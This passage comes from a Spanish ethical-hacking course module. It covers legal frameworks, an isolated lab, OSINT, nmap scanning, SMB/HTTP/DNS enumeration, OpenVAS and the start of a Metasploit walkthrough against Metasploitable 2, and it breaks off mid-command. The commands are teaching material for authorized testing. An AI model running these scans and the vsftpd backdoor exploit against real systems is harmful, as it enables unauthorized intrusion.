# 5025 - Hacking ético

## Introducción al módulo

El módulo profesional **5025 - Hacking ético** pertenece al **Curso de Especialización en Ciberseguridad en Entornos de las Tecnologías de la Información**, regulado por el **Real Decreto 479/2020, de 5 de mayo**. Este módulo aborda la disciplina del **hacking ético** o **pentesting** (test de intrusión) entendida como una práctica **profesional, autorizada y legal** cuyo fin último es **evaluar la seguridad de sistemas propios o de terceros que han otorgado permiso expreso**, con el objetivo de **descubrir vulnerabilidades antes de que lo haga un atacante real** y proponer las **medidas de mitigación** correspondientes.

El hacking ético invierte la perspectiva del atacante para ponerla al servicio de la defensa. Un profesional de la seguridad ofensiva debe **pensar como un adversario** (adoptar la mentalidad de la cadena de ataque, o *kill chain*) pero **actuar como un auditor**: con metodología reproducible, con documentación exhaustiva, dentro de un **alcance (scope) contractualmente definido** y con la **autorización por escrito** del titular de los sistemas. La diferencia entre un pentester y un ciberdelincuente **no reside en las herramientas ni en las técnicas**, que son idénticas, sino en la **autorización, la intención y la responsabilidad legal**.

A lo largo del módulo se recorren las cuatro grandes fases del ciclo de una auditoría ofensiva —**reconocimiento y enumeración**, **análisis de vulnerabilidades**, **explotación** y **post-explotación**— más dos áreas transversales de creciente importancia: la **auditoría de redes inalámbricas** y la **ingeniería social**. Todo ello enmarcado en un **marco ético y legal** que se estudia en primer lugar por su carácter fundacional: sin autorización, ninguna de las técnicas siguientes es legítima.

### Tabla resumen del módulo

| Elemento | Detalle |
|---|---|
| **Código y denominación** | 5025 - Hacking ético |
| **Curso de especialización** | Ciberseguridad en Entornos de las Tecnologías de la Información |
| **Normativa** | Real Decreto 479/2020, de 5 de mayo |
| **Duración total del curso** | 720 horas |
| **Familia profesional** | Informática y Comunicaciones |
| **Nivel** | Curso de especialización de grado superior |
| **Prerrequisitos recomendados** | Redes TCP/IP, administración de sistemas Linux y Windows, fundamentos de programación/scripting (Bash, Python), conceptos de seguridad informática |
| **Modalidad de prácticas** | Laboratorio virtualizado aislado (red host-only) y plataformas legales de entrenamiento |
| **Herramientas base** | Kali Linux / Parrot OS, nmap, Nessus/OpenVAS, Metasploit, Burp Suite, Hydra, John the Ripper/Hashcat, aircrack-ng, Gophish, SET |
| **Marcos de referencia** | PTES, OSSTMM, OWASP WSTG, MITRE ATT&CK, NIST SP 800-115 |

### Competencias asociadas

Este módulo contribuye a que el alumnado adquiera la competencia general del curso de especialización de **definir e implementar estrategias y controles de seguridad**, y de forma específica desarrolla la capacidad de:

- Realizar **pruebas de intrusión controladas y autorizadas** siguiendo metodologías reconocidas.
- Detectar, clasificar y documentar **vulnerabilidades** en sistemas y redes.
- Emitir **informes técnicos y ejecutivos** con recomendaciones de mitigación priorizadas por riesgo.
- Aplicar el **marco normativo** (Código Penal, RGPD, LOPDGDD) a la actividad de auditoría.

---

> ## ⚠️ AVISO LEGAL DESTACADO — LECTURA OBLIGATORIA
>
> **Todas las técnicas descritas en este documento se enseñan con fines exclusivamente formativos y defensivos.** Ejecutar cualquiera de ellas contra sistemas, redes, aplicaciones o personas sin **autorización expresa, previa y por escrito** del titular legítimo constituye un **delito** tipificado en el **Código Penal español** (arts. 197 bis, 197 ter, 264 y concordantes), con penas que pueden incluir **prisión**.
>
> **Regla de oro del módulo:** *"Sin permiso firmado, no se toca nada."*
>
> Todos los laboratorios de este módulo se realizan **EXCLUSIVAMENTE** contra:
> - **Máquinas vulnerables de práctica propias** (Metasploitable 2/3, imágenes de VulnHub, DVWA, OWASP Juice Shop) desplegadas en una **red virtual aislada de tipo host-only**, sin salida a Internet ni a la red doméstica/corporativa.
> - **Plataformas legales de entrenamiento** (Hack The Box, TryHackMe) donde el usuario dispone de una cuenta y **permiso explícito** para atacar las máquinas objetivo de la plataforma.
>
> Nunca se atacan objetivos reales de terceros. El objetivo pedagógico es **comprender las técnicas para poder defender y auditar con autorización**.

---

## Resultados de Aprendizaje

A continuación se presentan los Resultados de Aprendizaje (RA) del módulo con sus criterios de evaluación resumidos, siguiendo el estilo del BOE.

### RA1. Determina el marco legal y ético de las auditorías de seguridad, analizando la legislación vigente y las buenas prácticas profesionales.

**Criterios de evaluación (resumidos):**
- a) Se ha identificado la legislación aplicable a los test de intrusión (Código Penal, RGPD, LOPDGDD).
- b) Se ha diferenciado la actividad de pentesting autorizada de la actividad ilícita.
- c) Se ha valorado la importancia del contrato de auditoría, las reglas de enfrentamiento (ROE) y la definición del alcance.
- d) Se han descrito los principios de la divulgación responsable de vulnerabilidades.
- e) Se han reconocido las metodologías y marcos de referencia del sector.

### RA2. Realiza tareas de reconocimiento y enumeración de objetivos autorizados, empleando técnicas de recopilación de información y escaneo.

**Criterios de evaluación (resumidos):**
- a) Se ha recopilado información pública (OSINT) de forma pasiva y ética.
- b) Se han realizado barridos de descubrimiento de hosts y escaneos de puertos.
- c) Se han identificado servicios, versiones y sistemas operativos.
- d) Se han enumerado servicios concretos (SMB, HTTP, DNS).
- e) Se han identificado vulnerabilidades potenciales mediante escáneres y bases de datos.

### RA3. Explota vulnerabilidades en entornos de laboratorio autorizados, utilizando frameworks y herramientas de seguridad ofensiva.

**Criterios de evaluación (resumidos):**
- a) Se han seleccionado y configurado exploits contra vulnerabilidades conocidas.
- b) Se han empleado frameworks de explotación (Metasploit).
- c) Se han realizado ataques de fuerza bruta controlados contra servicios de autenticación.
- d) Se ha realizado el crackeo de hashes de contraseñas de práctica.
- e) Se han documentado las evidencias de la explotación.

### RA4. Ejecuta técnicas de post-explotación en entornos autorizados, analizando la escalada de privilegios, la persistencia y el movimiento lateral desde una perspectiva defensiva.

**Criterios de evaluación (resumidos):**
- a) Se ha realizado la escalada de privilegios en sistemas Linux y Windows de laboratorio.
- b) Se han identificado mecanismos de persistencia y sus indicadores de compromiso.
- c) Se han descrito técnicas de movimiento lateral.
- d) Se ha valorado la detección y la respuesta ante cada técnica.

### RA5. Realiza auditorías de redes inalámbricas e ingeniería social simulada en entornos autorizados, aplicando el consentimiento y la ética profesional.

**Criterios de evaluación (resumidos):**
- a) Se han analizado las debilidades de los protocolos Wi-Fi (WEP, WPA2, WPA3).
- b) Se ha capturado y analizado tráfico inalámbrico de la propia red de laboratorio.
- c) Se ha diseñado una campaña de phishing simulado autorizada.
- d) Se han elaborado materiales de concienciación de usuarios.

---

## Unidad Didáctica 1 — Marco ético y legal del hacking ético

### 1.1. Por qué la ética y la ley son parte del temario técnico

En el hacking ético, el conocimiento del **marco jurídico** no es un apéndice administrativo, sino un **componente técnico de primer orden**. La razón es simple: las mismas acciones que en un contexto autorizado constituyen una auditoría profesional, en ausencia de autorización constituyen un delito. Un pentester que no domina los límites legales de su actividad es un profesional incompleto y, potencialmente, un delincuente involuntario.

El principio rector es la **autorización previa, expresa y por escrito**. Ninguna palabra, ningún acuerdo verbal, ninguna suposición ("dábamos por hecho que estaba permitido") sustituye a un documento firmado por quien tiene la **capacidad legal de autorizar** el acceso a los sistemas. Un directivo puede autorizar auditar los sistemas de su empresa; no puede autorizar auditar los sistemas de un proveedor, de un cliente o de un tercero, aunque estén "conectados".

### 1.2. Delitos informáticos en el Código Penal español

La reforma del Código Penal (LO 1/2015 y posteriores) tipifica de forma específica los delitos contra los sistemas de información. Los artículos más relevantes para el pentester son:

| Artículo | Conducta tipificada | Relevancia para el pentesting |
|---|---|---|
| **Art. 197 bis** | Acceso o facilitación de acceso no autorizado al conjunto o parte de un sistema de información, vulnerando medidas de seguridad; e interceptación de transmisiones no públicas de datos | Es el "delito de intrusismo informático". Un escaneo intrusivo o un acceso sin permiso encaja aquí. |
| **Art. 197 ter** | Producción, adquisición, importación o facilitación de programas o contraseñas destinados a cometer los delitos anteriores | Afecta al uso y distribución de herramientas y credenciales cuando la finalidad es delictiva. |
| **Art. 264** | Daños informáticos: borrado, alteración, supresión o inutilización de datos, programas o documentos electrónicos ajenos | Cubre la fase de explotación cuando causa daño (p. ej., un exploit que deja un servicio inoperativo). |
| **Art. 264 bis** | Obstaculización o interrupción del funcionamiento de un sistema informático ajeno (denegación de servicio) | Un ataque DoS no autorizado, incluso "accidental" durante un escaneo agresivo. |
| **Art. 264 ter** | Facilitación de la comisión de los delitos de daños (fabricación/tenencia de herramientas) | Análogo al 197 ter para daños. |

**Consideración clave sobre el "dolo".** El Código Penal exige, en general, **dolo** (intención). Sin embargo, en el contexto profesional esto **no es una salvaguarda**: un escaneo agresivo que tumba un servidor de un tercero puede interpretarse como imprudencia grave, y la ausencia de autorización elimina cualquier justificación. Además, el art. 197 bis penaliza el **acceso no autorizado en sí mismo**, sin necesidad de que se produzca daño posterior.

### 1.3. RGPD y protección de datos en los pentests

Durante una auditoría es **muy frecuente encontrar datos personales**: credenciales, correos, DNI en bases de datos, ficheros de RRHH, etc. La actividad del pentester está sujeta al **Reglamento General de Protección de Datos (RGPD, UE 2016/679)** y a la **Ley Orgánica 3/2018 (LOPDGDD)**.

Implicaciones prácticas:

- El pentester actúa habitualmente como **encargado del tratamiento** por cuenta del cliente (**responsable del tratamiento**), lo que exige un **contrato de encargo de tratamiento** (art. 28 RGPD).
- Debe aplicarse el principio de **minimización**: solo se accede a los datos estrictamente necesarios para demostrar la vulnerabilidad. **No se exfiltra** una base de datos completa si basta con extraer un registro de muestra ("prueba de concepto").
- Las **evidencias** que contengan datos personales deben **cifrarse**, almacenarse de forma segura y **destruirse** al finalizar el encargo según lo pactado.
- Un incidente durante la auditoría que exponga datos podría requerir **notificación a la AEPD** en 72 horas.

### 1.4. El contrato de auditoría, el alcance y las Reglas de Enfrentamiento (ROE)

Antes de cualquier acción técnica se firma la documentación contractual. Los elementos imprescindibles son:

- **Autorización expresa firmada** por persona con capacidad legal ("*authorization to test*" o "*get out of jail letter*"): documento que el pentester conserva y que acredita que actúa con permiso.
- **Alcance (scope):** definición exacta y cerrada de qué IPs, dominios, rangos de red, aplicaciones y horarios están dentro del ejercicio. **Todo lo que no está explícitamente dentro, está fuera.**
- **Reglas de Enfrentamiento (ROE, *Rules of Engagement*):** qué técnicas están permitidas y cuáles prohibidas (p. ej., ¿se permite ingeniería social?, ¿se permiten ataques de denegación de servicio?, ¿se puede explotar en producción o solo en preproducción?).
- **Ventana temporal:** fechas y franjas horarias autorizadas.
- **Contactos de emergencia y cláusula de parada** ("*stop condition*"): a quién avisar y cómo detener el ejercicio si algo va mal (caída de un sistema crítico, hallazgo de una brecha real en curso).
- **Cláusula de confidencialidad (NDA).**

### 1.5. Tipos de auditoría según el conocimiento previo

| Tipo | Información entregada al auditor | Simula a... |
|---|---|---|
| **Caja negra (black box)** | Ninguna o mínima (solo el objetivo) | Un atacante externo sin información privilegiada. |
| **Caja gris (grey box)** | Parcial (credenciales de usuario básico, diagramas) | Un atacante con acceso limitado o un empleado. |
| **Caja blanca (white box)** | Completa (código fuente, arquitectura, credenciales admin) | Auditoría interna exhaustiva; maximiza cobertura. |

### 1.6. Divulgación responsable de vulnerabilidades

Cuando un investigador descubre una vulnerabilidad (por ejemplo, en un producto de software), la **divulgación responsable** (*responsible disclosure* / *coordinated vulnerability disclosure*) establece que:

1. Se **notifica de forma privada** al fabricante o responsable.
2. Se concede un **plazo razonable** para corregir (típicamente 90 días).
3. Solo tras el parche —o vencido el plazo con acuerdo— se hace pública la información.
4. Se **evita publicar exploits funcionales** que faciliten ataques mientras existan sistemas sin parchear.

Los **programas de recompensas (bug bounty)** formalizan este proceso: el investigador tiene autorización dentro de un alcance definido y percibe una compensación. Fuera de un programa, buscar vulnerabilidades en sistemas de terceros **no está autorizado**.

### 1.7. Metodologías y marcos de referencia

El hacking ético profesional se apoya en **metodologías reproducibles**:

- **PTES** (*Penetration Testing Execution Standard*): define 7 fases, de la interacción previa al informe.
- **OSSTMM** (*Open Source Security Testing Methodology Manual*): metodología de medición de la seguridad operativa.
- **OWASP WSTG** (*Web Security Testing Guide*): guía específica para aplicaciones web.
- **NIST SP 800-115**: guía técnica del NIST para la evaluación de la seguridad de la información.
- **MITRE ATT&CK**: base de conocimiento de tácticas y técnicas de adversarios, muy útil para mapear hallazgos y para la defensa.

> ### ✍️ Ejercicios propuestos
> 1. Redacta un modelo de **carta de autorización** para una auditoría interna ficticia, incluyendo alcance, ventana temporal, ROE y cláusula de parada.
> 2. Elabora una tabla que relacione **tres acciones técnicas** del módulo (escaneo agresivo, fuerza bruta, exfiltración de datos) con el **artículo del Código Penal** que se infringiría de realizarse sin autorización.
> 3. Investiga y resume el **programa de divulgación coordinada del INCIBE** y cómo debe reportarse una vulnerabilidad hallada en un producto español.

---

## Unidad Didáctica 2 — Preparación del laboratorio y metodología

### 2.1. Filosofía del entorno aislado

> **🔒 Recordatorio ético:** Todas las prácticas que siguen se realizan en un laboratorio virtual **aislado**. Nunca contra sistemas de terceros.

El laboratorio de pentesting debe estar **completamente aislado** de cualquier red de producción, doméstica o corporativa. El riesgo no es solo legal (atacar por error una IP real) sino también de seguridad: las máquinas vulnerables que descargamos (Metasploitable, VulnHub) son **deliberadamente inseguras** y, si tuvieran salida a Internet, podrían ser comprometidas por atacantes reales y usarse contra terceros.

### 2.2. Arquitectura recomendada del laboratorio

Se emplea un hipervisor (**VirtualBox**, **VMware Workstation/Player** o **Proxmox**) con una **red interna de tipo host-only** o "red interna". En esta red se despliegan:

| Rol | Máquina virtual sugerida | Sistema |
|---|---|---|
| **Atacante** | Kali Linux o Parrot Security OS | Linux con herramientas preinstaladas |
| **Diana Linux** | Metasploitable 2 / 3 | Linux deliberadamente vulnerable |
| **Diana web** | DVWA, OWASP Juice Shop, bWAPP | Aplicaciones web vulnerables |
| **Diana Windows** | Metasploitable 3 (Windows) o VM de práctica | Windows para escalada y AD |

Configuración de red típica: adaptador en modo **host-only** (p. ej. red `192.168.56.0/24` en VirtualBox), **sin** adaptador NAT ni puente para las dianas vulnerables. La máquina atacante puede tener un segundo adaptador NAT temporal **solo** para instalar herramientas, que se **desactiva** durante los laboratorios ofensivos.

### 2.3. Las fases de una auditoría (ciclo del pentesting)

Aunque cada metodología las nombra de forma distinta, las fases operativas de un test de intrusión son:

1. **Interacción previa y alcance** (contrato, ROE).
2. **Reconocimiento** (recopilación de información pasiva y activa).
3. **Enumeración** (identificación detallada de servicios).
4. **Análisis de vulnerabilidades.**
5. **Explotación** (obtención de acceso).
6. **Post-explotación** (escalada, persistencia, movimiento lateral, recopilación de evidencias).
7. **Informe** (documentación y recomendaciones).

Un principio metodológico esencial es el de **la cadena de comprobación**: cada hallazgo debe estar **documentado con evidencias** (capturas, comandos, salidas) que permitan **reproducirlo**, y cada acción debe **quedar registrada** con fecha y hora para trazabilidad.

> ### 🧪 Laboratorio práctico (entorno autorizado): Montaje del laboratorio
> **Diana de práctica:** Metasploitable 2 y Kali Linux en red host-only `192.168.56.0/24`.
>
> 1. Instala VirtualBox y crea una red host-only (`vboxnet0`).
> 2. Importa la VM de Kali Linux y la de Metasploitable 2. Asigna a ambas **únicamente** el adaptador host-only.
> 3. Verifica el aislamiento: desde Kali, intenta hacer ping a una IP pública (p. ej. `8.8.8.8`). **No debe haber respuesta.** Si la hay, el laboratorio **no** está aislado.
> 4. Comprueba conectividad interna: `ping 192.168.56.101` (IP de Metasploitable).
>
> **🛡️ Contramedida / defensa:** La segmentación de red que aquí usamos para aislar el laboratorio es la misma técnica que en producción **contiene un ataque**: microsegmentación y VLANs impiden que el compromiso de una máquina alcance al resto de la red.

> ### ✍️ Ejercicios propuestos
> 1. Documenta con capturas la verificación de aislamiento de tu laboratorio.
> 2. Dibuja el diagrama de red de tu laboratorio indicando IPs, adaptadores y aislamiento.

---

## Unidad Didáctica 3 — Reconocimiento y OSINT

### 3.1. Reconocimiento pasivo frente a activo

> **🔒 Recordatorio ético:** El OSINT descrito se practica sobre **dominios y datos propios o de laboratorio**. No se recopila información de organizaciones o personas reales sin autorización; hacerlo puede vulnerar el RGPD y la intimidad (art. 197 CP).

El **reconocimiento** (o *footprinting*) es la primera fase técnica. Consiste en **recopilar información sobre el objetivo** antes de interactuar directamente con sus sistemas. Se divide en:

- **Reconocimiento pasivo:** se obtiene información **sin tocar** los sistemas del objetivo, usando fuentes públicas (registros DNS, buscadores, redes sociales, filtraciones públicas). Es indetectable por el objetivo.
- **Reconocimiento activo:** implica **interactuar** con los sistemas (escaneos, consultas directas). Genera tráfico detectable.

### 3.2. OSINT (Open Source Intelligence)

El **OSINT** es la disciplina de obtener inteligencia a partir de **fuentes abiertas**. En un pentest ayuda a construir el "mapa" del objetivo: dominios, subdominios, direcciones de correo, tecnologías, empleados (para ingeniería social), fugas de credenciales publicadas.

| Herramienta / técnica | Uso didáctico | Consideración ética |
|---|---|---|
| **theHarvester** | Recopila correos, subdominios y hosts de fuentes públicas | Solo sobre dominios propios o autorizados |
| **Maltego** | Correlaciona entidades (personas, dominios, IPs) en grafos | Cuidado con datos personales (RGPD) |
| **Google dorks** | Operadores de búsqueda (`site:`, `filetype:`, `intitle:`) para localizar información expuesta | Buscar información **de nuestro propio dominio** para detectar fugas |
| **Consultas WHOIS / DNS** | Titularidad de dominios y registros | Información pública, pero minimizar su uso |
| **Shodan / Censos de Internet** | Motores que indexan dispositivos expuestos | Solo consultar activos propios |

**Ejemplo de Google dorks (aplicado al propio dominio para autoevaluación):**

```text
site:midominio-de-laboratorio.local filetype:pdf
site:midominio-de-laboratorio.local intitle:"index of"
site:midominio-de-laboratorio.local ext:sql OR ext:bak
```

El objetivo defensivo de este ejercicio es **descubrir qué información sensible de tu propia organización está expuesta** e indexada, para retirarla.

> ### 🧪 Laboratorio práctico (entorno autorizado): OSINT sobre dominio propio
> **Diana de práctica:** un dominio de laboratorio propio o el dominio de tu centro (con autorización del centro).
>
> ```bash
> # Recopilación pasiva de subdominios y correos (dominio propio autorizado)
> theHarvester -d midominio-de-laboratorio.local -b bing,duckduckgo
> # Consulta de registros DNS públicos
> dig midominio-de-laboratorio.local ANY
> host -t mx midominio-de-laboratorio.local
> ```
>
> **🛡️ Contramedida / defensa:** Reducir la **superficie de información expuesta**: eliminar metadatos de documentos publicados, evitar exponer correos internos, configurar `robots.txt` con criterio, no publicar registros DNS innecesarios y monitorizar filtraciones de credenciales (servicios de *breach monitoring*).

> ### ✍️ Ejercicios propuestos
> 1. Ejecuta theHarvester contra un dominio propio y clasifica la información obtenida por sensibilidad.
> 2. Diseña **cinco Google dorks** orientados a detectar fugas de información de tu propia organización.
> 3. Explica cómo el OSINT alimenta una posterior campaña de **ingeniería social** y qué medidas de concienciación lo dificultan.

---

## Unidad Didáctica 4 — Escaneo de puertos y descubrimiento de servicios

### 4.1. Descubrimiento de hosts

> **🔒 Recordatorio ético:** Todos los escaneos se realizan **solo** contra las dianas de laboratorio (`192.168.56.0/24`). Escanear una red ajena sin permiso puede constituir acceso ilícito (art. 197 bis CP).

Antes de escanear puertos conviene saber **qué hosts están vivos**. Con **nmap** un barrido de descubrimiento:

```bash
# Barrido de host discovery (solo ping/ARP, sin escaneo de puertos)
nmap -sn 192.168.56.0/24
```

### 4.2. Fundamentos del escaneo de puertos con nmap

**nmap** (*Network Mapper*) es la herramienta de referencia. Es esencial comprender el **modelo de estados de puerto** y los **tipos de escaneo**:

| Estado del puerto | Significado |
|---|---|
| **open** | Hay un servicio aceptando conexiones |
| **closed** | El puerto responde pero no hay servicio escuchando |
| **filtered** | Un cortafuegos filtra; nmap no puede determinar el estado |
| **unfiltered** | Accesible pero estado indeterminado (típico de escaneo ACK) |

**Tipos y opciones de escaneo fundamentales:**

| Opción | Nombre | Descripción |
|---|---|---|
| `-sS` | **SYN scan** (*half-open*) | Envía SYN, espera SYN/ACK y no completa el *handshake*. Rápido y relativamente sigiloso. Requiere privilegios. |
| `-sT` | **TCP connect** | Completa el *handshake* TCP. Se usa sin privilegios; más ruidoso y registrable. |
| `-sU` | **UDP scan** | Escaneo de puertos UDP (DNS, SNMP, DHCP). Lento pero necesario. |
| `-sV` | **Detección de versiones** | Interroga los servicios para determinar producto y versión. |
| `-O` | **Detección de SO** | Estima el sistema operativo por huellas de pila TCP/IP. |
| `-sC` | **Scripts por defecto** | Ejecuta el conjunto de scripts NSE "default". |
| `-p-` | **Todos los puertos** | Escanea los 65535 puertos TCP. |
| `-T0`…`-T5` | **Temporización** | De `-T0` (paranoico, lento) a `-T5` (agresivo). |
| `-A` | **Agresivo** | Combina `-sV -O -sC` y traceroute. |

### 4.3. Nmap Scripting Engine (NSE)

El **NSE** amplía nmap con scripts en Lua para descubrimiento, enumeración y detección de vulnerabilidades. Se organizan en categorías (`safe`, `default`, `vuln`, `auth`, `brute`, `discovery`).

```bash
# Escaneo de versiones + scripts por defecto contra la diana de laboratorio
nmap -sV -sC 192.168.56.101

# Uso de scripts de una categoría concreta (¡ojo!, vuln y brute son intrusivos)
nmap --script vuln 192.168.56.101
```

> ### 🧪 Laboratorio práctico (entorno autorizado): Escaneo completo de Metasploitable 2
> **Diana de práctica:** Metasploitable 2 en `192.168.56.101` (red host-only).
>
> ```bash
> # 1. Descubrimiento de host
> nmap -sn 192.168.56.0/24
>
> # 2. Escaneo SYN de todos los puertos TCP con detección de versiones y SO
> sudo nmap -sS -sV -O -p- 192.168.56.101 -oN metasploitable_full.txt
>
> # 3. Enriquecimiento con scripts por defecto sobre puertos abiertos
> sudo nmap -sC -sV -p 21,22,80,139,445,3306 192.168.56.101
> ```
>
> **Resultado esperado (extracto):** puertos como 21/ftp (vsftpd 2.3.4), 22/ssh, 80/http (Apache), 139-445/smb (Samba), 3306/mysql, entre otros. Se guardan las salidas (`-oN`, `-oX`) como evidencia.
>
> **🛡️ Contramedida / defensa:** Reducir la superficie de exposición cerrando servicios innecesarios (*hardening*), colocar un **cortafuegos** que filtre puertos, ocultar *banners* de versión, y desplegar un **IDS/IPS** (Snort, Suricata) que detecte los patrones de escaneo (muchos SYN a puertos secuenciales) y bloquee la IP origen.

> ### ✍️ Ejercicios propuestos
> 1. Compara el tráfico generado por `-sS` frente a `-sT` capturándolo con Wireshark en tu laboratorio.
> 2. Realiza un escaneo UDP (`-sU`) de los 100 puertos más comunes y explica por qué es más lento.
> 3. Investiga tres scripts NSE de la categoría `discovery` y describe qué información aportan.

---

## Unidad Didáctica 5 — Enumeración de servicios

### 5.1. Concepto de enumeración

La **enumeración** profundiza en cada servicio descubierto para extraer información concreta: **usuarios, recursos compartidos, versiones exactas, configuraciones y posibles puntos de entrada**. Es la fase que conecta el reconocimiento con la explotación.

> **🔒 Recordatorio ético:** Enumeración solo sobre dianas de laboratorio autorizadas.

### 5.2. Enumeración de SMB (puertos 139/445)

El servicio **SMB/Samba** (compartición de archivos Windows/Linux) es un objetivo clásico por la información que revela (usuarios, comparticiones, políticas).

```bash
# Listar recursos compartidos con acceso anónimo
smbclient -L //192.168.56.101/ -N

# Enumeración con enum4linux (usuarios, grupos, comparticiones, políticas)
enum4linux -a 192.168.56.101

# Scripts NSE de SMB
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 139,445 192.168.56.101
```

### 5.3. Enumeración de HTTP/HTTPS (puertos 80/443)

En servicios web se enumeran directorios ocultos, tecnologías, ficheros de configuración y CMS.

```bash
# Identificación de tecnologías
whatweb http://192.168.56.101/

# Enumeración de directorios y ficheros
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt

# Enumeración de servidor y opciones
nmap --script http-enum,http-headers -p 80 192.168.56.101
```

### 5.4. Enumeración de DNS

```bash
# Transferencia de zona (mal configurada = fuga masiva de registros)
dig axfr @192.168.56.101 laboratorio.local

# Enumeración de subdominios y registros
dnsenum laboratorio.local
```

Una **transferencia de zona (AXFR)** mal restringida expone todos los registros DNS internos: es una vulnerabilidad de configuración clásica.

### 5.5. Otros servicios frecuentes

| Servicio | Puerto | Qué se enumera |
|---|---|---|
| **FTP** | 21 | Login anónimo, versión, ficheros |
| **SSH** | 22 | Versión, algoritmos, banners |
| **SNMP** | 161/udp | Comunidad `public`, información del sistema (`snmpwalk`) |
| **MySQL** | 3306 | Versión, acceso sin credenciales |
| **SMTP** | 25 | Comandos `VRFY`/`EXPN` para verificar usuarios |

> ### 🧪 Laboratorio práctico (entorno autorizado): Enumeración SMB y HTTP de Metasploitable 2
> **Diana de práctica:** Metasploitable 2 en `192.168.56.101`.
>
> ```bash
> enum4linux -a 192.168.56.101 | tee enum_smb.txt
> smbclient -L //192.168.56.101/ -N
> whatweb http://192.168.56.101/
> gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
> ```
> Identifica al menos: recursos compartidos accesibles, versión de Samba y aplicaciones web presentes (DVWA, Mutillidae, etc.).
>
> **🛡️ Contramedida / defensa:** En SMB, **deshabilitar el acceso anónimo/null session**, firmar SMB y aplicar el principio de mínimo privilegio en las comparticiones. En HTTP, **eliminar aplicaciones y directorios no usados**, deshabilitar el listado de directorios y no exponer paneles de administración. En DNS, **restringir las transferencias de zona** a servidores secundarios autorizados.

> ### ✍️ Ejercicios propuestos
> 1. Enumera el servicio SNMP de una diana de laboratorio con `snmpwalk` usando la comunidad `public` y explica el riesgo.
> 2. Intenta una transferencia de zona AXFR contra tu DNS de laboratorio y luego configúralo para impedirla.
> 3. Documenta la enumeración de usuarios vía SMTP (`VRFY`) y su contramedida.

---

## Unidad Didáctica 6 — Identificación y análisis de vulnerabilidades

### 6.1. De la enumeración a la vulnerabilidad

Con los servicios y versiones identificados, la siguiente fase es **determinar qué vulnerabilidades conocidas afectan** a esos componentes. Aquí entran las **bases de datos de vulnerabilidades** y los **escáneres automatizados**.

> **🔒 Recordatorio ético:** El escaneo de vulnerabilidades es **intrusivo** y puede afectar a la estabilidad de un servicio; solo se realiza en laboratorio o con autorización explícita en el alcance.

### 6.2. CVE, CVSS y bases de datos

- **CVE** (*Common Vulnerabilities and Exposures*): identificador único de cada vulnerabilidad pública (p. ej. `CVE-2011-2523`).
- **CVSS** (*Common Vulnerability Scoring System*): puntúa la gravedad de 0 a 10 (Base, Temporal, Ambiental).
- **NVD** (*National Vulnerability Database*) del NIST: repositorio principal.
- **Exploit-DB**: base de datos de exploits públicos, consultable con `searchsploit`.

```bash
# Buscar exploits públicos para un servicio identificado (offline, local)
searchsploit vsftpd 2.3.4
searchsploit samba 3.0
# Copiar un exploit a la carpeta de trabajo para estudiarlo
searchsploit -m unix/remote/17491.rb
```

### 6.3. Escáneres de vulnerabilidades: Nessus y OpenVAS

Los escáneres automatizados **correlacionan** los servicios detectados con bases de vulnerabilidades y emiten un informe con hallazgos priorizados por CVSS.

| Escáner | Características |
|---|---|
| **Nessus** (Tenable) | Comercial (versión Essentials gratuita limitada). Muy amplio catálogo de *plugins*. |
| **OpenVAS / Greenbone** | Solución de código abierto. Feed de NVTs (*Network Vulnerability Tests*). |

El proceso típico: se define el objetivo (solo laboratorio), se elige una **política de escaneo** (más o menos intrusiva), se lanza y se **valida manualmente** cada hallazgo, descartando los **falsos positivos**.

> ### 🧪 Laboratorio práctico (entorno autorizado): Escaneo de vulnerabilidades con OpenVAS
> **Diana de práctica:** Metasploitable 2 en `192.168.56.101`.
>
> 1. Instala Greenbone/OpenVAS en Kali (`sudo gvm-setup`, `sudo gvm-start`).
> 2. Accede a la interfaz web (`https://127.0.0.1:9392`).
> 3. Crea un *Target* con la IP `192.168.56.101` y lanza una *Task* con la política "Full and fast".
> 4. Analiza el informe: identifica vulnerabilidades críticas (p. ej. la backdoor de vsftpd 2.3.4, distcc, Samba) y su CVE/CVSS.
> 5. Contrasta con `searchsploit` la existencia de exploits públicos.
>
> **🛡️ Contramedida / defensa:** La contramedida esencial es la **gestión de parches (patch management)**: mantener el software actualizado elimina la mayoría de vulnerabilidades conocidas. Complementariamente, la **gestión de vulnerabilidades continua** (escaneos periódicos autorizados sobre los propios activos) permite priorizar la corrección por riesgo.

> ### ✍️ Ejercicios propuestos
> 1. Genera un informe de OpenVAS y clasifica los cinco hallazgos más graves por CVSS, indicando su vector.
> 2. Para tres CVE detectados, localiza en la NVD la versión que corrige el fallo.
> 3. Explica la diferencia entre un **falso positivo** y un **falso negativo** y por qué la validación manual es imprescindible.

---

## Unidad Didáctica 7 — Explotación de sistemas con Metasploit

### 7.1. Fundamentos de la explotación

> **🔒 Recordatorio ético:** La explotación **solo** se practica contra máquinas vulnerables propias (Metasploitable, VulnHub) en red host-only, o en plataformas legales de entrenamiento. Ejecutar un exploit contra un sistema ajeno sin autorización es un delito (arts. 197 bis y 264 CP).

La **explotación** consiste en **aprovechar una vulnerabilidad** para obtener acceso o ejecutar código en el objetivo. El "porqué" siempre importa: un exploit funciona porque existe un fallo (desbordamiento de búfer, inyección, credenciales por defecto, configuración incorrecta) que rompe una suposición de seguridad del software.

Conceptos clave:

- **Exploit:** código o técnica que aprovecha la vulnerabilidad.
- **Payload:** código que se ejecuta tras la explotación (p. ej. una shell inversa, un Meterpreter).
- **Shell inversa (reverse shell) vs. directa (bind shell):** en la inversa, la víctima **se conecta hacia** el atacante (evita cortafuegos entrantes); en la directa, el atacante se conecta a un puerto que abre la víctima.

### 7.2. El framework Metasploit

**Metasploit Framework** es la plataforma de explotación de referencia. Su consola es `msfconsole`. Componentes:

| Componente | Función |
|---|---|
| **Exploits** | Módulos que aprovechan vulnerabilidades |
| **Payloads** | Código a ejecutar tras el compromiso (Meterpreter, shells) |
| **Auxiliary** | Escáneres, fuzzers, sniffers (no explotan directamente) |
| **Encoders** | Codifican payloads para evasión (a nivel conceptual) |
| **Post** | Módulos de post-explotación |

**Flujo de trabajo básico de msfconsole:**

```bash
msfconsole                      # arrancar la consola
search vsftpd                   # buscar módulos por palabra clave
use exploit/unix/ftp/vsftpd_234_backdoor
info                            # ver descripción, opciones y referencias
show options                    # ver parámetros requeridos
set RHOSTS 192.168.56.101       # objetivo (diana de laboratorio)
set LHOST 192.168.56.102        # nuestra IP (para reverse)
show payloads
